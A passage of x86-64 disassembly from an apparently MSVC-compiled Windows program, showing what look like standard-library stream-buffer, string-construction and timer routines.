   140005976:	e8 85 13 00 00       	call   0x140006d00
   14000597b:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140005982:	00 
   140005983:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140005987:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000598b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   14000598f:	49 8b e3             	mov    %r11,%rsp
   140005992:	5d                   	pop    %rbp
   140005993:	c3                   	ret
   140005994:	cc                   	int3
   140005995:	cc                   	int3
   140005996:	cc                   	int3
   140005997:	cc                   	int3
   140005998:	cc                   	int3
   140005999:	cc                   	int3
   14000599a:	cc                   	int3
   14000599b:	cc                   	int3
   14000599c:	cc                   	int3
   14000599d:	cc                   	int3
   14000599e:	cc                   	int3
   14000599f:	cc                   	int3
   1400059a0:	40 53                	rex push %rbx
   1400059a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400059a6:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400059aa:	48 8b d9             	mov    %rcx,%rbx
   1400059ad:	48 8b 08             	mov    (%rax),%rcx
   1400059b0:	48 85 c9             	test   %rcx,%rcx
   1400059b3:	74 18                	je     0x1400059cd
   1400059b5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400059b9:	48 63 10             	movslq (%rax),%rdx
   1400059bc:	48 03 d1             	add    %rcx,%rdx
   1400059bf:	48 3b ca             	cmp    %rdx,%rcx
   1400059c2:	73 09                	jae    0x1400059cd
   1400059c4:	0f b6 01             	movzbl (%rcx),%eax
   1400059c7:	48 83 c4 20          	add    $0x20,%rsp
   1400059cb:	5b                   	pop    %rbx
   1400059cc:	c3                   	ret
   1400059cd:	48 8b 03             	mov    (%rbx),%rax
   1400059d0:	48 8b cb             	mov    %rbx,%rcx
   1400059d3:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400059d8:	ff 50 38             	call   *0x38(%rax)
   1400059db:	8b f8                	mov    %eax,%edi
   1400059dd:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400059e0:	75 0b                	jne    0x1400059ed
   1400059e2:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400059e7:	48 83 c4 20          	add    $0x20,%rsp
   1400059eb:	5b                   	pop    %rbx
   1400059ec:	c3                   	ret
   1400059ed:	48 8b 03             	mov    (%rbx),%rax
   1400059f0:	8b d7                	mov    %edi,%edx
   1400059f2:	48 8b cb             	mov    %rbx,%rcx
   1400059f5:	ff 50 20             	call   *0x20(%rax)
   1400059f8:	8b c7                	mov    %edi,%eax
   1400059fa:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400059ff:	48 83 c4 20          	add    $0x20,%rsp
   140005a03:	5b                   	pop    %rbx
   140005a04:	c3                   	ret
   140005a05:	cc                   	int3
   140005a06:	cc                   	int3
   140005a07:	cc                   	int3
   140005a08:	cc                   	int3
   140005a09:	cc                   	int3
   140005a0a:	cc                   	int3
   140005a0b:	cc                   	int3
   140005a0c:	cc                   	int3
   140005a0d:	cc                   	int3
   140005a0e:	cc                   	int3
   140005a0f:	cc                   	int3
   140005a10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a15:	57                   	push   %rdi
   140005a16:	48 83 ec 20          	sub    $0x20,%rsp
   140005a1a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140005a1e:	48 8b d9             	mov    %rcx,%rbx
   140005a21:	8b fa                	mov    %edx,%edi
   140005a23:	48 8b 08             	mov    (%rax),%rcx
   140005a26:	48 85 c9             	test   %rcx,%rcx
   140005a29:	74 38                	je     0x140005a63
   140005a2b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140005a2f:	48 39 08             	cmp    %rcx,(%rax)
   140005a32:	73 2f                	jae    0x140005a63
   140005a34:	83 fa ff             	cmp    $0xffffffff,%edx
   140005a37:	74 08                	je     0x140005a41
   140005a39:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   140005a3d:	3b c2                	cmp    %edx,%eax
   140005a3f:	75 22                	jne    0x140005a63
   140005a41:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005a45:	ff 00                	incl   (%rax)
   140005a47:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005a4b:	48 ff 08             	decq   (%rax)
   140005a4e:	33 c0                	xor    %eax,%eax
   140005a50:	83 ff ff             	cmp    $0xffffffff,%edi
   140005a53:	0f 44 f8             	cmove  %eax,%edi
   140005a56:	8b c7                	mov    %edi,%eax
   140005a58:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005a5d:	48 83 c4 20          	add    $0x20,%rsp
   140005a61:	5f                   	pop    %rdi
   140005a62:	c3                   	ret
   140005a63:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005a6a:	48 85 d2             	test   %rdx,%rdx
   140005a6d:	74 73                	je     0x140005ae2
   140005a6f:	83 ff ff             	cmp    $0xffffffff,%edi
   140005a72:	74 6e                	je     0x140005ae2
   140005a74:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   140005a79:	75 0f                	jne    0x140005a8a
   140005a7b:	40 0f b6 cf          	movzbl %dil,%ecx
   140005a7f:	ff 15 cb 3a 00 00    	call   *0x3acb(%rip)        # 0x140009550
   140005a85:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005a88:	75 cc                	jne    0x140005a56
   140005a8a:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   140005a8e:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140005a92:	49 39 11             	cmp    %rdx,(%r9)
   140005a95:	74 4b                	je     0x140005ae2
   140005a97:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   140005a9b:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   140005a9f:	40 88 3a             	mov    %dil,(%rdx)
   140005aa2:	49 8b 02             	mov    (%r10),%rax
   140005aa5:	48 3b c2             	cmp    %rdx,%rax
   140005aa8:	74 17                	je     0x140005ac1
   140005aaa:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140005ab1:	49 8b 00             	mov    (%r8),%rax
   140005ab4:	48 63 08             	movslq (%rax),%rcx
   140005ab7:	49 03 09             	add    (%r9),%rcx
   140005aba:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140005ac1:	49 89 12             	mov    %rdx,(%r10)
   140005ac4:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005ac8:	2b da                	sub    %edx,%ebx
   140005aca:	83 c3 71             	add    $0x71,%ebx
   140005acd:	48 89 10             	mov    %rdx,(%rax)
   140005ad0:	49 8b 00             	mov    (%r8),%rax
   140005ad3:	89 18                	mov    %ebx,(%rax)
   140005ad5:	8b c7                	mov    %edi,%eax
   140005ad7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005adc:	48 83 c4 20          	add    $0x20,%rsp
   140005ae0:	5f                   	pop    %rdi
   140005ae1:	c3                   	ret
   140005ae2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005ae7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005aec:	48 83 c4 20          	add    $0x20,%rsp
   140005af0:	5f                   	pop    %rdi
   140005af1:	c3                   	ret
   140005af2:	cc                   	int3
   140005af3:	cc                   	int3
   140005af4:	cc                   	int3
   140005af5:	cc                   	int3
   140005af6:	cc                   	int3
   140005af7:	cc                   	int3
   140005af8:	cc                   	int3
   140005af9:	cc                   	int3
   140005afa:	cc                   	int3
   140005afb:	cc                   	int3
   140005afc:	cc                   	int3
   140005afd:	cc                   	int3
   140005afe:	cc                   	int3
   140005aff:	cc                   	int3
   140005b00:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005b05:	57                   	push   %rdi
   140005b06:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140005b0d:	48 8b 05 2c 85 00 00 	mov    0x852c(%rip),%rax        # 0x14000e040
   140005b14:	48 33 c4             	xor    %rsp,%rax
   140005b17:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140005b1c:	8b fa                	mov    %edx,%edi
   140005b1e:	48 8b d9             	mov    %rcx,%rbx
   140005b21:	83 fa ff             	cmp    $0xffffffff,%edx
   140005b24:	75 07                	jne    0x140005b2d
   140005b26:	33 c0                	xor    %eax,%eax
   140005b28:	e9 6c 01 00 00       	jmp    0x140005c99
   140005b2d:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140005b31:	48 8b 10             	mov    (%rax),%rdx
   140005b34:	48 85 d2             	test   %rdx,%rdx
   140005b37:	74 2e                	je     0x140005b67
   140005b39:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140005b3d:	4c 63 00             	movslq (%rax),%r8
   140005b40:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   140005b44:	48 3b d1             	cmp    %rcx,%rdx
   140005b47:	73 1e                	jae    0x140005b67
   140005b49:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140005b4d:	89 08                	mov    %ecx,(%rax)
   140005b4f:	8b c7                	mov    %edi,%eax
   140005b51:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140005b55:	4c 8b 02             	mov    (%rdx),%r8
   140005b58:	49 8d 48 01          	lea    0x1(%r8),%rcx
   140005b5c:	48 89 0a             	mov    %rcx,(%rdx)
   140005b5f:	41 88 38             	mov    %dil,(%r8)
   140005b62:	e9 32 01 00 00       	jmp    0x140005c99
   140005b67:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140005b6e:	00 
   140005b6f:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140005b76:	00 
   140005b77:	0f 84 0f 01 00 00    	je     0x140005c8c
   140005b7d:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140005b81:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005b85:	49 39 00             	cmp    %rax,(%r8)
   140005b88:	75 20                	jne    0x140005baa
   140005b8a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140005b91:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140005b98:	49 89 08             	mov    %rcx,(%r8)
   140005b9b:	2b d1                	sub    %ecx,%edx
   140005b9d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005ba1:	48 89 08             	mov    %rcx,(%rax)
   140005ba4:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005ba8:	89 10                	mov    %edx,(%rax)
   140005baa:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005bae:	48 85 c9             	test   %rcx,%rcx
   140005bb1:	75 22                	jne    0x140005bd5
   140005bb3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005bba:	40 0f be cf          	movsbl %dil,%ecx
   140005bbe:	ff 15 dc 39 00 00    	call   *0x39dc(%rip)        # 0x1400095a0
   140005bc4:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005bc9:	3b c1                	cmp    %ecx,%eax
   140005bcb:	0f 45 cf             	cmovne %edi,%ecx
   140005bce:	8b c1                	mov    %ecx,%eax
   140005bd0:	e9 bc 00 00 00       	jmp    0x140005c91
   140005bd5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140005bda:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   140005bdf:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005be4:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005be8:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140005bed:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005bf2:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140005bf7:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140005bfc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005c01:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140005c06:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005c0b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005c10:	ff 15 6a 35 00 00    	call   *0x356a(%rip)        # 0x140009180
   140005c16:	85 c0                	test   %eax,%eax
   140005c18:	74 2a                	je     0x140005c44
   140005c1a:	83 e8 01             	sub    $0x1,%eax
   140005c1d:	74 25                	je     0x140005c44
   140005c1f:	83 f8 02             	cmp    $0x2,%eax
   140005c22:	75 68                	jne    0x140005c8c
   140005c24:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   140005c29:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005c30:	ff 15 6a 39 00 00    	call   *0x396a(%rip)        # 0x1400095a0
   140005c36:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005c3b:	3b c1                	cmp    %ecx,%eax
   140005c3d:	0f 45 cf             	cmovne %edi,%ecx
   140005c40:	8b c1                	mov    %ecx,%eax
   140005c42:	eb 4d                	jmp    0x140005c91
   140005c44:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005c49:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140005c4e:	48 2b f0             	sub    %rax,%rsi
   140005c51:	74 1f                	je     0x140005c72
   140005c53:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140005c5a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140005c5f:	4c 8b c6             	mov    %rsi,%r8
   140005c62:	ba 01 00 00 00       	mov    $0x1,%edx
   140005c67:	ff 15 03 39 00 00    	call   *0x3903(%rip)        # 0x140009570
   140005c6d:	48 3b f0             	cmp    %rax,%rsi
   140005c70:	75 1a                	jne    0x140005c8c
   140005c72:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140005c77:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   140005c7b:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140005c80:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005c85:	0f 45 cf             	cmovne %edi,%ecx
   140005c88:	8b c1                	mov    %ecx,%eax
   140005c8a:	eb 05                	jmp    0x140005c91
   140005c8c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005c91:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140005c98:	00 
   140005c99:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005c9e:	48 33 cc             	xor    %rsp,%rcx
   140005ca1:	e8 5a 10 00 00       	call   0x140006d00
   140005ca6:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140005cad:	00 
   140005cae:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005cb5:	5f                   	pop    %rdi
   140005cb6:	c3                   	ret
   140005cb7:	cc                   	int3
   140005cb8:	cc                   	int3
   140005cb9:	cc                   	int3
   140005cba:	cc                   	int3
   140005cbb:	cc                   	int3
   140005cbc:	cc                   	int3
   140005cbd:	cc                   	int3
   140005cbe:	cc                   	int3
   140005cbf:	cc                   	int3
   140005cc0:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005cc7:	48 85 c9             	test   %rcx,%rcx
   140005cca:	74 07                	je     0x140005cd3
   140005ccc:	48 ff 25 85 37 00 00 	rex.W jmp *0x3785(%rip)        # 0x140009458
   140005cd3:	c3                   	ret
   140005cd4:	cc                   	int3
   140005cd5:	cc                   	int3
   140005cd6:	cc                   	int3
   140005cd7:	cc                   	int3
   140005cd8:	cc                   	int3
   140005cd9:	cc                   	int3
   140005cda:	cc                   	int3
   140005cdb:	cc                   	int3
   140005cdc:	cc                   	int3
   140005cdd:	cc                   	int3
   140005cde:	cc                   	int3
   140005cdf:	cc                   	int3
   140005ce0:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005ce7:	48 85 c9             	test   %rcx,%rcx
   140005cea:	74 07                	je     0x140005cf3
   140005cec:	48 ff 25 6d 37 00 00 	rex.W jmp *0x376d(%rip)        # 0x140009460
   140005cf3:	c3                   	ret
   140005cf4:	cc                   	int3
   140005cf5:	cc                   	int3
   140005cf6:	cc                   	int3
   140005cf7:	cc                   	int3
   140005cf8:	cc                   	int3
   140005cf9:	cc                   	int3
   140005cfa:	cc                   	int3
   140005cfb:	cc                   	int3
   140005cfc:	cc                   	int3
   140005cfd:	cc                   	int3
   140005cfe:	cc                   	int3
   140005cff:	cc                   	int3
   140005d00:	40 53                	rex push %rbx
   140005d02:	48 83 ec 20          	sub    $0x20,%rsp
   140005d06:	48 8b d9             	mov    %rcx,%rbx
   140005d09:	48 8d 05 18 44 00 00 	lea    0x4418(%rip),%rax        # 0x14000a128
   140005d10:	48 89 01             	mov    %rax,(%rcx)
   140005d13:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005d1a:	00 
   140005d1b:	74 2f                	je     0x140005d4c
   140005d1d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140005d21:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005d25:	48 39 01             	cmp    %rax,(%rcx)
   140005d28:	75 22                	jne    0x140005d4c
   140005d2a:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005d31:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005d38:	48 89 11             	mov    %rdx,(%rcx)
   140005d3b:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005d3f:	48 89 10             	mov    %rdx,(%rax)
   140005d42:	44 2b c2             	sub    %edx,%r8d
   140005d45:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005d49:	44 89 00             	mov    %r8d,(%rax)
   140005d4c:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005d50:	74 08                	je     0x140005d5a
   140005d52:	48 8b cb             	mov    %rbx,%rcx
   140005d55:	e8 16 06 00 00       	call   0x140006370
   140005d5a:	48 8b cb             	mov    %rbx,%rcx
   140005d5d:	48 83 c4 20          	add    $0x20,%rsp
   140005d61:	5b                   	pop    %rbx
   140005d62:	48 ff 25 07 34 00 00 	rex.W jmp *0x3407(%rip)        # 0x140009170
   140005d69:	cc                   	int3
   140005d6a:	cc                   	int3
   140005d6b:	cc                   	int3
   140005d6c:	cc                   	int3
   140005d6d:	cc                   	int3
   140005d6e:	cc                   	int3
   140005d6f:	cc                   	int3
   140005d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d75:	57                   	push   %rdi
   140005d76:	48 83 ec 20          	sub    $0x20,%rsp
   140005d7a:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140005d81:	8b da                	mov    %edx,%ebx
   140005d83:	48 8b cf             	mov    %rdi,%rcx
   140005d86:	e8 85 d8 ff ff       	call   0x140003610
   140005d8b:	f6 c3 01             	test   $0x1,%bl
   140005d8e:	74 0d                	je     0x140005d9d
   140005d90:	ba 08 01 00 00       	mov    $0x108,%edx
   140005d95:	48 8b cf             	mov    %rdi,%rcx
   140005d98:	e8 83 0f 00 00       	call   0x140006d20
   140005d9d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005da2:	48 8b c7             	mov    %rdi,%rax
   140005da5:	48 83 c4 20          	add    $0x20,%rsp
   140005da9:	5f                   	pop    %rdi
   140005daa:	c3                   	ret
   140005dab:	cc                   	int3
   140005dac:	cc                   	int3
   140005dad:	cc                   	int3
   140005dae:	cc                   	int3
   140005daf:	cc                   	int3
   140005db0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005db5:	57                   	push   %rdi
   140005db6:	48 83 ec 20          	sub    $0x20,%rsp
   140005dba:	8b fa                	mov    %edx,%edi
   140005dbc:	48 8b d9             	mov    %rcx,%rbx
   140005dbf:	48 8d 05 62 43 00 00 	lea    0x4362(%rip),%rax        # 0x14000a128
   140005dc6:	48 89 01             	mov    %rax,(%rcx)
   140005dc9:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005dd0:	00 
   140005dd1:	74 2d                	je     0x140005e00
   140005dd3:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140005dd7:	48 8d 41 70          	lea    0x70(%rcx),%rax
   140005ddb:	49 39 00             	cmp    %rax,(%r8)
   140005dde:	75 20                	jne    0x140005e00
   140005de0:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140005de7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140005dee:	49 89 08             	mov    %rcx,(%r8)
   140005df1:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005df5:	48 89 08             	mov    %rcx,(%rax)
   140005df8:	2b d1                	sub    %ecx,%edx
   140005dfa:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005dfe:	89 10                	mov    %edx,(%rax)
   140005e00:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005e04:	74 08                	je     0x140005e0e
   140005e06:	48 8b cb             	mov    %rbx,%rcx
   140005e09:	e8 62 05 00 00       	call   0x140006370
   140005e0e:	48 8b cb             	mov    %rbx,%rcx
   140005e11:	ff 15 59 33 00 00    	call   *0x3359(%rip)        # 0x140009170
   140005e17:	90                   	nop
   140005e18:	40 f6 c7 01          	test   $0x1,%dil
   140005e1c:	74 0d                	je     0x140005e2b
   140005e1e:	ba 98 00 00 00       	mov    $0x98,%edx
   140005e23:	48 8b cb             	mov    %rbx,%rcx
   140005e26:	e8 f5 0e 00 00       	call   0x140006d20
   140005e2b:	48 8b c3             	mov    %rbx,%rax
   140005e2e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005e33:	48 83 c4 20          	add    $0x20,%rsp
   140005e37:	5f                   	pop    %rdi
   140005e38:	c3                   	ret
   140005e39:	cc                   	int3
   140005e3a:	cc                   	int3
   140005e3b:	cc                   	int3
   140005e3c:	cc                   	int3
   140005e3d:	cc                   	int3
   140005e3e:	cc                   	int3
   140005e3f:	cc                   	int3
   140005e40:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005e45:	55                   	push   %rbp
   140005e46:	56                   	push   %rsi
   140005e47:	57                   	push   %rdi
   140005e48:	41 56                	push   %r14
   140005e4a:	41 57                	push   %r15
   140005e4c:	48 83 ec 30          	sub    $0x30,%rsp
   140005e50:	45 33 ff             	xor    %r15d,%r15d
   140005e53:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005e56:	49 8b d8             	mov    %r8,%rbx
   140005e59:	4c 8b f2             	mov    %rdx,%r14
   140005e5c:	48 8b f9             	mov    %rcx,%rdi
   140005e5f:	0f 11 01             	movups %xmm0,(%rcx)
   140005e62:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   140005e66:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140005e6a:	49 3b d0             	cmp    %r8,%rdx
   140005e6d:	75 11                	jne    0x140005e80
   140005e6f:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005e76:	00 
   140005e77:	66 44 89 39          	mov    %r15w,(%rcx)
   140005e7b:	e9 f6 00 00 00       	jmp    0x140005f76
   140005e80:	49 2b de             	sub    %r14,%rbx
   140005e83:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   140005e8a:	ff ff 7f 
   140005e8d:	48 d1 fb             	sar    $1,%rbx
   140005e90:	48 3b dd             	cmp    %rbp,%rbx
   140005e93:	0f 87 f1 00 00 00    	ja     0x140005f8a
   140005e99:	48 83 fb 07          	cmp    $0x7,%rbx
   140005e9d:	77 21                	ja     0x140005ec0
   140005e9f:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140005ea3:	48 03 db             	add    %rbx,%rbx
   140005ea6:	4c 8b c3             	mov    %rbx,%r8
   140005ea9:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005eb0:	00 
   140005eb1:	e8 05 1e 00 00       	call   0x140007cbb
   140005eb6:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140005ebb:	e9 b6 00 00 00       	jmp    0x140005f76
   140005ec0:	48 8b c3             	mov    %rbx,%rax
   140005ec3:	48 83 c8 07          	or     $0x7,%rax
   140005ec7:	48 3b c5             	cmp    %rbp,%rax
   140005eca:	76 47                	jbe    0x140005f13
   140005ecc:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005ed3:	ff ff 7f 
   140005ed6:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140005eda:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140005ee1:	72 6a                	jb     0x140005f4d
   140005ee3:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140005ee7:	48 3b c1             	cmp    %rcx,%rax
   140005eea:	0f 86 a0 00 00 00    	jbe    0x140005f90
   140005ef0:	48 8b c8             	mov    %rax,%rcx
   140005ef3:	e8 30 0e 00 00       	call   0x140006d28
   140005ef8:	48 85 c0             	test   %rax,%rax
   140005efb:	75 42                	jne    0x140005f3f
   140005efd:	45 33 c9             	xor    %r9d,%r9d
   140005f00:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005f05:	45 33 c0             	xor    %r8d,%r8d
   140005f08:	33 d2                	xor    %edx,%edx
   140005f0a:	33 c9                	xor    %ecx,%ecx
   140005f0c:	ff 15 2e 36 00 00    	call   *0x362e(%rip)        # 0x140009540
   140005f12:	cc                   	int3
   140005f13:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140005f18:	48 8b e8             	mov    %rax,%rbp
   140005f1b:	48 3b c1             	cmp    %rcx,%rax
   140005f1e:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005f25:	ff ff 7f 
   140005f28:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140005f2c:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140005f30:	48 3b c8             	cmp    %rax,%rcx
   140005f33:	77 5b                	ja     0x140005f90
   140005f35:	48 03 c9             	add    %rcx,%rcx
   140005f38:	75 a0                	jne    0x140005eda
   140005f3a:	49 8b f7             	mov    %r15,%rsi
   140005f3d:	eb 16                	jmp    0x140005f55
   140005f3f:	48 8d 70 27          	lea    0x27(%rax),%rsi
   140005f43:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   140005f47:	48 89 46 f8          	mov    %rax,-0x8(%rsi)
   140005f4b:	eb 08                	jmp    0x140005f55
   140005f4d:	e8 d6 0d 00 00       	call   0x140006d28
   140005f52:	48 8b f0             	mov    %rax,%rsi
   140005f55:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140005f59:	49 8b d6             	mov    %r14,%rdx
   140005f5c:	48 03 db             	add    %rbx,%rbx
   140005f5f:	48 89 37             	mov    %rsi,(%rdi)
   140005f62:	4c 8b c3             	mov    %rbx,%r8
   140005f65:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140005f69:	48 8b ce             	mov    %rsi,%rcx
   140005f6c:	e8 4a 1d 00 00       	call   0x140007cbb
   140005f71:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140005f76:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140005f7b:	48 8b c7             	mov    %rdi,%rax
   140005f7e:	48 83 c4 30          	add    $0x30,%rsp
   140005f82:	41 5f                	pop    %r15
   140005f84:	41 5e                	pop    %r14
   140005f86:	5f                   	pop    %rdi
   140005f87:	5e                   	pop    %rsi
   140005f88:	5d                   	pop    %rbp
   140005f89:	c3                   	ret
   140005f8a:	e8 21 b4 ff ff       	call   0x1400013b0
   140005f8f:	cc                   	int3
   140005f90:	e8 fb b2 ff ff       	call   0x140001290
   140005f95:	cc                   	int3
   140005f96:	cc                   	int3
   140005f97:	cc                   	int3
   140005f98:	cc                   	int3
   140005f99:	cc                   	int3
   140005f9a:	cc                   	int3
   140005f9b:	cc                   	int3
   140005f9c:	cc                   	int3
   140005f9d:	cc                   	int3
   140005f9e:	cc                   	int3
   140005f9f:	cc                   	int3
   140005fa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005fa5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005faa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005faf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005fb4:	41 56                	push   %r14
   140005fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140005fba:	48 8b f9             	mov    %rcx,%rdi
   140005fbd:	48 be 00 00 4f 91 94 	movabs $0x4e94914f0000,%rsi
   140005fc4:	4e 00 00 
   140005fc7:	48 bd db 34 b6 d7 82 	movabs $0x431bde82d7b634db,%rbp
   140005fce:	de 1b 43 
   140005fd1:	49 be f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r14
   140005fd8:	fc f4 b2 
   140005fdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fe0:	ff 15 b2 31 00 00    	call   *0x31b2(%rip)        # 0x140009198
   140005fe6:	48 8b d8             	mov    %rax,%rbx
   140005fe9:	ff 15 11 32 00 00    	call   *0x3211(%rip)        # 0x140009200
   140005fef:	48 8b c8             	mov    %rax,%rcx
   140005ff2:	48 81 fb 80 96 98 00 	cmp    $0x989680,%rbx
   140005ff9:	75 06                	jne    0x140006001
   140005ffb:	48 6b c1 64          	imul   $0x64,%rcx,%rax
   140005fff:	eb 71                	jmp    0x140006072
   140006001:	48 81 fb 00 36 6e 01 	cmp    $0x16e3600,%rbx
   140006008:	75 4a                	jne    0x140006054
   14000600a:	49 8b c6             	mov    %r14,%rax
   14000600d:	48 f7 e9             	imul   %rcx
   140006010:	4c 8d 04 11          	lea    (%rcx,%rdx,1),%r8
   140006014:	49 c1 f8 18          	sar    $0x18,%r8
   140006018:	49 8b c0             	mov    %r8,%rax
   14000601b:	48 c1 e8 3f          	shr    $0x3f,%rax
